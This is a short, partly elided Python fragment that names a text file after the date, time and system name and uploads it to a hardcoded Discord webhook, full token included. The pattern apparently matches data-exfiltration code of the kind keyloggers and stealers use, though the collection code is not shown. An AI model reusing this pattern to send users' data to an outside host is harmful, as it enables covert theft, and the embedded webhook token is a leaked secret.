...
def write_file():
    global file_to_create
    file_to_create = current_date.strftime("%Y-%m-%d") + current_time.strftime("T%H%M%S") + system_name + ".txt"
...
def web_hook():
    webhook_url = "https://discordapp.com/api/webhooks/769143400120188949/FfnJ1o1waWZqjPYs12XImL2sC-WcQMmxkRjZVaGr2m5ooYmiDS1yQ03yundjNM8PJuNC"

    webhook = DiscordWebhook(url=webhook_url, content=file_to_create)

    with open(file_to_create, "rb") as f:
        webhook.add_file(file=f.read(), filename=file_to_create)
